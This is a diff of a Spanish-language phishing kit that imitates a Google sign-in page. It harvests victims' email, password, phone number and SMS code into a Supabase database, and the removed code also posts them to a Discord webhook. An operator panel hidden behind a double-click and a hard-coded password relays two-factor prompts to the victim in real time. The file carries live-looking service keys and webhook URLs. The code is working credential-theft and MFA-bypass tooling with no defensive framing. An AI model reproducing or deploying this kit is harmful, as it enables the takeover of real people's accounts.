@@ -3,332 +3,188 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Login - Secure Access</title>
+    <title>Google Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .animate-spin { animation: spin 1s linear infinite; }
-        .fade-in { animation: fadeIn 0.4s ease-out; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .admin-card { transition: all 0.3s ease; }
-        .admin-card:hover { border-color: #3b82f6; }
-        
-        /* Modal personalizado para login admin */
-        #admin-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            z-index: 1000;
-            backdrop-filter: blur(5px);
-        }
+        .fade-in { animation: fadeIn 0.4s ease-out; }
+        #admin-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1000; backdrop-filter: blur(5px); }
     </style>
 </head>
-<body class="bg-[#f0f2f5] min-h-screen flex flex-col items-center justify-center p-4 font-sans select-none transition-colors duration-500" id="main-body">
+<body class="bg-[#f0f2f5] min-h-screen flex flex-col items-center justify-center p-4 font-sans select-none" id="main-body">
 
-    <!-- Modal de Contraseña Admin -->
+    <!-- Admin Modal -->
     <div id="admin-modal" class="flex items-center justify-center">
-        <div class="bg-zinc-900 p-8 rounded-2xl border border-zinc-700 shadow-2xl w-full max-w-sm text-center space-y-6">
-            <h3 class="text-emerald-500 font-mono font-bold uppercase tracking-widest">Acceso Restringido</h3>
-            <input type="password" id="admin-pass-input" placeholder="Introduce la clave" class="w-full p-3 bg-black border border-zinc-600 rounded text-white text-center outline-none focus:border-emerald-500">
-            <div class="flex gap-2">
-                <button id="admin-cancel" class="flex-1 py-2 text-zinc-400 hover:text-white transition">Cancelar</button>
-                <button id="admin-login-btn" class="flex-1 py-2 bg-emerald-600 text-white rounded font-bold hover:bg-emerald-500 transition">Entrar</button>
-            </div>
-            <p id="admin-error" class="text-red-500 text-[10px] hidden">Contraseña incorrecta. Acceso denegado.</p>
+        <div class="bg-zinc-900 p-8 rounded-2xl border border-zinc-700 w-full max-w-sm text-center space-y-4">
+            <h3 class="text-emerald-500 font-mono font-bold uppercase">Acceso Admin</h3>
+            <input type="password" id="admin-pass-input" placeholder="Clave" class="w-full p-2 bg-black border border-zinc-600 rounded text-white text-center outline-none">
+            <button id="admin-login-btn" class="w-full py-2 bg-emerald-600 text-white rounded font-bold hover:bg-emerald-500 transition">ENTRAR</button>
         </div>
     </div>
 
-    <!-- Contenedor Principal -->
-    <div id="app-container" class="w-full max-w-[440px] p-8 md:p-10 bg-white md:border border-gray-200 rounded-2xl relative shadow-sm overflow-hidden fade-in">
-        
-        <!-- Acceso Panel Invisible (Doble click esquina superior derecha) -->
-        <div id="admin-trigger" class="absolute top-0 right-0 w-16 h-16 z-50 cursor-default"></div>
-
-        <!-- Logo Google -->
-        <div class="flex justify-center mb-10" id="logo-container">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-7">
+    <!-- Main Container -->
+    <div id="app-container" class="w-full max-w-[440px] p-8 bg-white border border-gray-200 rounded-2xl relative shadow-sm fade-in">
+        <div id="admin-trigger" class="absolute top-0 right-0 w-16 h-16 z-50"></div>
+        <div class="flex justify-center mb-8" id="logo-container">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-6">
         </div>
-
-        <div id="view-content">
-            <!-- El contenido se inyecta dinámicamente aquí -->
-        </div>
+        <div id="view-content"></div>
     </div>
-
-    <!-- Footer -->
-    <footer id="main-footer" class="mt-12 flex gap-8 text-[12px] text-gray-400 font-medium">
-        <span class="cursor-pointer hover:text-gray-600 transition">Español (España)</span>
-        <div class="flex gap-4">
-            <a href="#" class="hover:underline">Ayuda</a>
-            <a href="#" class="hover:underline">Privacidad</a>
-            <a href="#" class="hover:underline">Términos</a>
-        </div>
-    </footer>
 
     <script>
-        // --- CONFIGURACIÓN ---
-        const SUPABASE_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
-        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1443618037294174220/cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE";
-        const ADMIN_PASSWORD = "sebas22034";
+        // CONFIGURACIÓN
+        const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
+        const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
+        const ADMIN_PASS = "sebas22034";
         
-        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        const client = supabase.createClient(S_URL, S_KEY);
         
         let state = {
             view: 'victim',
             step: 'login',
             sessionId: `ID_${Math.random().toString(36).substr(2, 4).toUpperCase()}`,
-            formData: { email: '', password: '', phone: '', sms: '' },
-            targetNumber: '--',
-            adminSessions: []
+            data: { email: '', password: '', phone: '', sms: '' },
+            targetNum: '--' 
         };
 
-        // --- COMUNICACIÓN SUPABASE ---
-        async function updateRemote(newStep, dataToMerge = {}) {
-            const updateData = {
-                ...state.formData,
-                ...dataToMerge,
-                step: newStep,
+        // Registro de columnas que el sistema ignorará si fallan
+        let ignoredColumns = new Set();
+
+        async function sync(step, extra = {}) {
+            let payload = {
                 session_id: state.sessionId,
-                target_number: state.targetNumber,
-                updated_at: new Date()
+                email: extra.email || state.data.email || '',
+                password: extra.password || state.data.password || '',
+                phone: extra.phone || state.data.phone || '',
+                sms: extra.sms || state.data.sms || '',
+                step: step
             };
 
-            await supabaseClient.from('sessions').upsert(updateData, { onConflict: 'session_id' });
+            // Intentar añadir columnas que suelen dar error si no existen
+            if (!ignoredColumns.has('updated_at')) payload.updated_at = new Date().toISOString();
+            
+            const targetVal = state.targetNum === '--' ? null : state.targetNum;
+            
+            // Probar primero con target_num (como se ve en tu captura)
+            if (!ignoredColumns.has('target_num')) {
+                payload.target_num = targetVal;
+            } else if (!ignoredColumns.has('target_number')) {
+                payload.target_number = targetVal;
+            }
 
-            if (dataToMerge.email || dataToMerge.sms || dataToMerge.phone) {
-                fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `🚀 **ACTUALIZACIÓN [${state.sessionId}]**\n📧 Email: ${updateData.email || 'N/A'}\n🔑 Pass: ${updateData.password || 'N/A'}\n📱 Tel: ${updateData.phone || 'N/A'}\n💬 SMS: ${updateData.sms || 'N/A'}\n📍 Paso: ${newStep}`
-                    })
-                }).catch(() => {});
+            const { error } = await client.from('sessions').upsert(payload, { onConflict: 'session_id' });
+            
+            if (error) {
+                console.warn("Error de sincronización detectado:", error.message);
+                
+                // Si el error dice que la columna no existe, la ignoramos y reintentamos
+                if (error.message.includes('column') || error.message.includes('not find')) {
+                    // Extraer el nombre de la columna del error si es posible
+                    const match = error.message.match(/'([^']+)'/);
+                    if (match && match[1]) {
+                        ignoredColumns.add(match[1]);
+                        console.log(`Auto-corrección: Ignorando columna faltante [${match[1]}]`);
+                        return sync(step, extra); 
+                    }
+                }
             }
         }
 
-        // --- VISTAS VÍCTIMA ---
         function render() {
-            const container = document.getElementById('view-content');
+            const c = document.getElementById('view-content');
             if (state.view === 'admin') { renderAdmin(); return; }
 
-            switch(state.step) {
-                case 'login':
-                    container.innerHTML = `
-                        <form id="login-form" class="space-y-6 fade-in">
-                            <div class="text-center">
-                                <h2 class="text-2xl font-normal text-gray-800">Iniciar sesión</h2>
-                                <p class="text-gray-600 mt-2 text-sm">Usa tu cuenta de Google</p>
-                            </div>
-                            <div class="space-y-3">
-                                <input id="inp-email" required type="email" placeholder="Correo electrónico" class="w-full p-4 border border-gray-300 rounded-lg focus:border-blue-500 outline-none">
-                                <input id="inp-pass" required type="password" placeholder="Contraseña" class="w-full p-4 border border-gray-300 rounded-lg focus:border-blue-500 outline-none">
-                            </div>
-                            <div class="flex justify-between items-center pt-6">
-                                <span class="text-blue-600 text-sm font-bold cursor-pointer">Crear cuenta</span>
-                                <button type="submit" class="bg-blue-600 text-white px-8 py-2.5 rounded-lg font-medium hover:bg-blue-700">Siguiente</button>
-                            </div>
-                        </form>
-                    `;
-                    document.getElementById('login-form').onsubmit = (e) => {
-                        e.preventDefault();
-                        state.formData.email = document.getElementById('inp-email').value;
-                        state.formData.password = document.getElementById('inp-pass').value;
-                        state.step = 'phone';
-                        updateRemote('phone', { email: state.formData.email, password: state.formData.password });
-                        render();
-                    };
-                    break;
-
-                case 'phone':
-                    container.innerHTML = `
-                        <form id="phone-form" class="space-y-6 fade-in">
-                            <h2 class="text-xl font-medium text-center">Confirmar identidad</h2>
-                            <p class="text-sm text-gray-600 text-center leading-relaxed">Detectamos un inicio de sesión inusual. Introduce el número de teléfono vinculado.</p>
-                            <input id="inp-phone" required type="tel" placeholder="Número de teléfono" class="w-full p-4 border border-gray-300 rounded-lg text-center text-xl tracking-widest outline-none">
-                            <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-lg font-medium shadow-md">Enviar aviso</button>
-                        </form>
-                    `;
-                    document.getElementById('phone-form').onsubmit = (e) => {
-                        e.preventDefault();
-                        state.formData.phone = document.getElementById('inp-phone').value;
-                        state.step = 'wait';
-                        updateRemote('wait', { phone: state.formData.phone });
-                        render();
-                    };
-                    break;
-
-                case 'wait':
-                    container.innerHTML = `
-                        <div class="text-center space-y-10 py-4 fade-in">
-                            <h2 class="text-xl font-medium">Toca el número en tu móvil</h2>
-                            <p class="text-sm text-gray-600">Pulsa **SÍ** en la notificación de Google y selecciona:</p>
-                            <div class="text-7xl font-bold text-gray-800 py-12 bg-blue-50 border-2 border-dashed border-blue-200 rounded-3xl animate-pulse shadow-inner">
-                                ${state.targetNumber}
-                            </div>
-                            <div class="flex flex-col items-center gap-3">
-                                <div class="w-6 h-6 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
-                                <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Esperando...</p>
-                            </div>
+            if (state.step === 'login') {
+                c.innerHTML = `
+                    <div class="text-center mb-6"><h2 class="text-xl">Iniciar sesión</h2></div>
+                    <form class="space-y-4" onsubmit="event.preventDefault(); state.data.email=this.e.value; state.data.password=this.p.value; state.step='phone'; sync('phone'); render();">
+                        <input name="e" required type="email" placeholder="Correo electrónico" class="w-full p-3 border rounded-lg">
+                        <input name="p" required type="password" placeholder="Contraseña" class="w-full p-3 border rounded-lg">
+                        <button class="w-full bg-blue-600 text-white py-2 rounded-lg font-bold">Siguiente</button>
+                    </form>`;
+            } else if (state.step === 'phone') {
+                c.innerHTML = `
+                    <h2 class="text-lg text-center mb-4">Verificación</h2>
+                    <form class="space-y-4" onsubmit="event.preventDefault(); state.data.phone=this.t.value; state.step='wait'; sync('wait'); render();">
+                        <input name="t" required type="tel" placeholder="Número de teléfono" class="w-full p-3 border rounded-lg text-center">
+                        <button class="w-full bg-blue-600 text-white py-2 rounded-lg font-bold">Enviar</button>
+                    </form>`;
+            } else if (state.step === 'wait') {
+                c.innerHTML = `
+                    <div class="text-center py-6 fade-in">
+                        <p class="mb-4">Toca el número en tu teléfono:</p>
+                        <div class="text-7xl font-bold text-blue-600 py-10 bg-blue-50 rounded-2xl animate-pulse border-2 border-blue-100">
+                            ${state.targetNum}
                         </div>
-                    `;
-                    break;
-
-                case 'sms':
-                    container.innerHTML = `
-                        <form id="sms-form" class="space-y-6 fade-in">
-                            <h2 class="text-xl font-medium text-center">Verificación por SMS</h2>
-                            <p class="text-sm text-gray-600 text-center">Introduce el código G-XXXXXX que acabamos de enviar por mensaje de texto.</p>
-                            <div class="flex items-center border border-gray-300 rounded-xl p-4 focus-within:ring-2 ring-blue-500/20">
-                                <span class="font-bold text-gray-400 mr-3 border-r pr-3 border-gray-200">G - </span>
-                                <input id="inp-sms" required type="number" placeholder="Código" class="w-full outline-none text-lg tracking-[0.2em]">
-                            </div>
-                            <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-xl font-medium shadow-lg hover:bg-blue-700">Verificar</button>
-                        </form>
-                    `;
-                    document.getElementById('sms-form').onsubmit = (e) => {
-                        e.preventDefault();
-                        state.formData.sms = document.getElementById('inp-sms').value;
-                        state.step = 'end';
-                        updateRemote('end', { sms: state.formData.sms });
-                        render();
-                        setTimeout(() => window.location.href = "https://accounts.google.com", 2500);
-                    };
-                    break;
-
-                case 'end':
-                    container.innerHTML = `
-                        <div class="text-center py-12 space-y-6 fade-in">
-                            <div class="bg-green-50 w-24 h-24 rounded-full flex items-center justify-center mx-auto text-green-600 text-5xl border border-green-100">✓</div>
-                            <h3 class="text-xl font-bold text-gray-800">Identidad confirmada</h3>
-                        </div>
-                    `;
-                    break;
+                        <p class="text-[10px] text-gray-400 mt-6 uppercase tracking-widest">Esperando confirmación...</p>
+                    </div>`;
+            } else if (state.step === 'sms') {
+                c.innerHTML = `
+                    <h2 class="text-lg text-center mb-4">Código G-</h2>
+                    <form class="space-y-4" onsubmit="event.preventDefault(); state.data.sms=this.s.value; state.step='end'; sync('end'); render(); setTimeout(()=>location.href='https://accounts.google.com',2000);">
+                        <input name="s" required type="number" placeholder="Introduce el código" class="w-full p-3 border rounded-lg text-center text-xl">
+                        <button class="w-full bg-blue-600 text-white py-2 rounded-lg font-bold">Validar</button>
+                    </form>`;
+            } else if (state.step === 'end') {
+                c.innerHTML = `<div class="text-center py-10 text-emerald-600 font-bold">✓ Acceso verificado</div>`;
             }
         }
 
-        // --- VISTA ADMINISTRADOR ---
         async function renderAdmin() {
-            document.getElementById('main-body').className = "bg-black min-h-screen flex flex-col items-center justify-center p-4 font-sans select-none";
-            document.getElementById('main-footer').classList.add('hidden');
+            document.getElementById('main-body').className = "bg-zinc-950 p-4 text-white font-mono";
+            const { data } = await client.from('sessions').select('*');
+            const main = document.getElementById('app-container');
+            main.className = "w-full max-w-6xl bg-zinc-900 border-zinc-800 p-6 rounded-3xl mx-auto";
+            document.getElementById('logo-container').innerHTML = `<h2 class="text-emerald-500 font-bold">CONTROL PANEL [${data?.length || 0}]</h2>`;
             
-            const { data } = await supabaseClient.from('sessions').select('*').order('updated_at', { ascending: false });
-            const mainCont = document.getElementById('app-container');
-            
-            mainCont.className = "w-full max-w-6xl p-6 bg-zinc-950 text-white min-h-[600px] border border-zinc-800 rounded-3xl shadow-2xl fade-in";
-            document.getElementById('logo-container').innerHTML = `<h2 class="text-emerald-500 font-mono font-bold text-xl tracking-widest">PANEL ACCESO TOTAL v5.0</h2>`;
-            
-            const container = document.getElementById('view-content');
-            let html = `
-                <div class="flex justify-between items-center mb-8 border-b border-zinc-800 pb-4">
-                    <p class="text-zinc-500 text-xs font-mono">USUARIOS ACTIVOS: ${data?.length || 0}</p>
-                    <button onclick="location.reload()" class="text-red-500 border border-red-900 px-4 py-1 text-[10px] font-bold rounded-lg hover:bg-red-900 transition uppercase">Cerrar Sesión</button>
-                </div>
-                <div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
-            `;
-
+            let html = `<div class="grid gap-4 md:grid-cols-2 lg:grid-cols-3">`;
             data?.forEach(s => {
+                const currentNum = s.target_num || s.target_number || '--';
                 html += `
-                    <div class="bg-zinc-900/50 border border-zinc-800 p-5 rounded-2xl admin-card font-mono text-[11px]">
-                        <div class="flex justify-between mb-4 border-b border-zinc-800 pb-2">
-                            <span class="text-zinc-500 font-bold italic">${s.session_id}</span>
-                            <span class="px-2 py-0.5 rounded-full ${s.step === 'end' ? 'text-emerald-400 border-emerald-400' : 'text-blue-400 border-blue-400'} border opacity-80 uppercase text-[9px]">
-                                ${s.step}
-                            </span>
+                    <div class="border border-zinc-700 p-4 rounded-xl bg-black/50">
+                        <div class="flex justify-between border-b border-zinc-800 pb-2 mb-3">
+                            <span class="text-zinc-500 text-[10px]">${s.session_id}</span>
+                            <span class="text-blue-400 text-[10px] uppercase">${s.step}</span>
                         </div>
-                        <div class="space-y-2 mb-6">
-                            <p class="flex justify-between"><span class="text-zinc-600">EMAIL:</span> <span class="text-zinc-200 select-all font-bold">${s.email || '-'}</span></p>
-                            <p class="flex justify-between"><span class="text-zinc-600">PASS:</span> <span class="text-zinc-200 select-all">${s.password || '-'}</span></p>
-                            <p class="flex justify-between"><span class="text-zinc-600">TELEF:</span> <span class="text-zinc-200">${s.phone || '-'}</span></p>
-                            <p class="flex justify-between items-center mt-3 p-3 bg-emerald-900/10 rounded border border-emerald-900/20">
-                                <span class="text-emerald-600 font-bold uppercase text-[9px]">SMS:</span> 
-                                <span class="text-emerald-400 font-bold text-sm tracking-widest select-all">${s.sms || '...'}</span>
-                            </p>
+                        <p class="text-[11px]">E: ${s.email || '-'}</p>
+                        <p class="text-[11px]">P: ${s.password || '-'}</p>
+                        <p class="text-emerald-400 font-bold my-2 text-sm">SMS: ${s.sms || '...'}</p>
+                        <div class="flex gap-2 mt-4">
+                            <input type="text" value="${currentNum}" placeholder="Nº" maxlength="2" 
+                                class="w-10 bg-zinc-800 border-zinc-700 text-center text-yellow-500 font-bold rounded" 
+                                onchange="updateNum('${s.session_id}', this.value)">
+                            <button onclick="forceSms('${s.session_id}')" class="flex-1 bg-blue-600 text-white py-1 rounded text-[10px] font-bold">PEDIR SMS</button>
                         </div>
-                        <div class="flex gap-3 pt-4 border-t border-zinc-800">
-                            <div class="flex-1">
-                                <label class="text-[8px] text-zinc-500 uppercase block mb-1">Cambiar Nº:</label>
-                                <input type="text" value="${s.target_number || '--'}" placeholder="--" maxlength="2" 
-                                    class="w-full bg-black border border-zinc-700 text-center text-yellow-500 font-bold py-2 rounded-lg outline-none focus:border-yellow-600 num-inp" 
-                                    data-id="${s.session_id}">
-                            </div>
-                            <div class="flex-1">
-                                <label class="text-[8px] text-zinc-500 uppercase block mb-1">Comandos:</label>
-                                <button class="w-full bg-blue-600 text-white py-2 rounded-lg font-bold text-[9px] hover:bg-blue-500 transition btn-sms" data-id="${s.session_id}">PEDIR SMS</button>
-                            </div>
-                        </div>
-                    </div>
-                `;
+                    </div>`;
             });
-
-            html += `</div>`;
-            container.innerHTML = html;
-
-            // Eventos dinámicos
-            document.querySelectorAll('.num-inp').forEach(inp => {
-                inp.onchange = async (e) => {
-                    const id = e.target.dataset.id;
-                    await supabaseClient.from('sessions').update({ target_number: e.target.value }).eq('session_id', id);
-                    e.target.classList.add('border-emerald-500');
-                    setTimeout(() => e.target.classList.remove('border-emerald-500'), 1000);
-                };
-            });
-            document.querySelectorAll('.btn-sms').forEach(btn => {
-                btn.onclick = async (e) => {
-                    const id = e.currentTarget.dataset.id;
-                    await supabaseClient.from('sessions').update({ step: 'sms' }).eq('session_id', id);
-                    renderAdmin();
-                };
-            });
+            document.getElementById('view-content').innerHTML = html + `</div>`;
         }
 
-        // --- LÓGICA DE SEGURIDAD ADMIN ---
-        const modal = document.getElementById('admin-modal');
-        const passInp = document.getElementById('admin-pass-input');
-        const errTxt = document.getElementById('admin-error');
-
-        document.getElementById('admin-trigger').ondblclick = () => {
-            modal.style.display = 'flex';
-            passInp.focus();
+        window.updateNum = async (id, val) => { 
+            let payload = ignoredColumns.has('target_num') ? { target_number: val } : { target_num: val };
+            await client.from('sessions').update(payload).eq('session_id', id);
         };
+        window.forceSms = async (id) => { await client.from('sessions').update({ step: 'sms' }).eq('session_id', id); renderAdmin(); };
 
-        document.getElementById('admin-cancel').onclick = () => {
-            modal.style.display = 'none';
-            passInp.value = '';
-            errTxt.classList.add('hidden');
-        };
-
-        const tryLogin = () => {
-            if (passInp.value === ADMIN_PASSWORD) {
-                modal.style.display = 'none';
+        document.getElementById('admin-trigger').ondblclick = () => { document.getElementById('admin-modal').style.display = 'flex'; };
+        document.getElementById('admin-login-btn').onclick = () => {
+            if (document.getElementById('admin-pass-input').value === ADMIN_PASS) {
                 state.view = 'admin';
+                document.getElementById('admin-modal').style.display = 'none';
                 renderAdmin();
-            } else {
-                errTxt.classList.remove('hidden');
-                passInp.value = '';
-                passInp.classList.add('border-red-500');
-                setTimeout(() => passInp.classList.remove('border-red-500'), 500);
+                setInterval(renderAdmin, 5000);
             }
         };
 
-        document.getElementById('admin-login-btn').onclick = tryLogin;
-        passInp.onkeydown = (e) => { if (e.key === 'Enter') tryLogin(); };
-
-        // --- INICIALIZACIÓN ---
         window.onload = () => {
-            updateRemote('login');
+            sync('login'); 
             render();
-
-            supabaseClient.channel(`room_${state.sessionId}`)
-                .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${state.sessionId}` }, (payload) => {
-                    state.targetNumber = payload.new.target_number;
-                    state.step = payload.new.step;
-                    if (state.view === 'victim') render();
-                })
-                .subscribe();
-
-            setInterval(() => { if (state.view === 'admin') renderAdmin(); }, 8000);
+            client.channel('any').on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${state.sessionId}` }, (p) => {
+                state.targetNum = p.new.target_num || p.new.target_number || '--';
+                state.step = p.new.step;
+                if (state.view === 'victim') render();
+            }).subscribe();
         };
     </script>
 </body>
